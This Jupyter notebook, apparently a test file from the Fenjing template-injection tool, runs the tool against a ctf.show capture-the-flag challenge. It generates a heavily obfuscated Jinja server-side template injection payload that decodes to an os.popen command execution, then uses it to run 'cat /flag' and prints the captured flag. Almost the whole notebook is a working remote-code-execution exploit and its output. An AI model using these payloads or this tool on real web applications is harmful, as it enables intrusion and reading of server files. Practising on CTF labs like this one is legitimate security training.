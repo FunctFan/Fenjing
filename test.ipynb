{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "import fenjing"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<function fenjing.test_form.test_form.<locals>.<lambda>(cmd)>"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "generate_payload = fenjing.test_form(\n",
    "    \"http://83384caa-c9c7-4ee7-a469-0fe225ea77ac.challenge.ctf.show/\",\n",
    "    fenjing.Form(\n",
    "        uri = \"/\",\n",
    "        method = \"GET\",\n",
    "        inputs = [\"name\"]\n",
    "    )\n",
    ")\n",
    "generate_payload"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'{{((lipsum|attr((lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last)+dict(globals=cycler)|join+(lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last))|attr((lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last)+dict(getitem=cycler)|join+(lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last))((lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last)+dict(builtins=cycler)|join+(lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last))|attr((lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last)+dict(getitem=cycler)|join+(lipsum|escape|batch(22)|list|first|last)+(lipsum|escape|batch(22)|list|first|last))(dict(eval=cycler)|join)))(((lipsum()|urlencode|first+dict(c=1)|join)*37)%(95,95,105,109,112,111,114,116,95,95,40,39,111,115,39,41,46,112,111,112,101,110,40,39,108,115,32,47,39,41,46,114,101,97,100,40,41))}}'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "generate_payload(\"ls /\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "\n",
      "\t<div class=\"center-content error\">\n",
      "\t\t<h1>Hello</h1>\n",
      "\t\t<h3>ctfshow{323e3fb4-2ca7-4c64-8494-724907623407}\n",
      "</h3>\n",
      "\t</div> \n",
      "\n"
     ]
    }
   ],
   "source": [
    "r = requests.get(\"http://83384caa-c9c7-4ee7-a469-0fe225ea77ac.challenge.ctf.show/\", params = {\n",
    "    \"name\": generate_payload(\"cat /flag\")\n",
    "})\n",
    "print(r.text)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.2"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
